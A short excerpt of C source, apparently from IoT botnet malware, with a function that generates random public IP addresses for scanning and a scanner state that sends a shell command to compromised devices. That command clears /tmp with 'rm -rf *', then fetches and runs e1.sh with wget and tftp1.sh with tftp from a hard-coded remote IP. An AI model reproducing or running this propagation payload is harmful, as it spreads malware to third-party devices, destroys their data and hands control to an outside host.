...
in_addr_t getRandomPublicIP()
{
	...
	while(
		...
		(ipState[1] == 180 && (ipState[2] <= 17 && ipState[2] <= 45)) ||
		(ipState[1] == 194 && ipState[2] == 0 && ipState[3] == 2) ||
		(ipState[1] == 198 && ipState[2] == 88 && ipState[3] == 99) ||
		(ipState[1] == 199 && ipState[2] == 168) ||
		(ipState[1] == 200 && (ipState[2] == 18 || ipState[2] == 19)) ||
		(ipState[1] == 201 && ipState[2] == 15 && ipState[3] == 100) ||
			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp || cd /var/run; rm -rf *; wget http://89.34.99.167/e1.sh; sh e1.sh; tftp -r tftp1.sh -g 89.34.99.167; sh tftp1.sh\r\n", 123, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
					fds[i].state = 9;
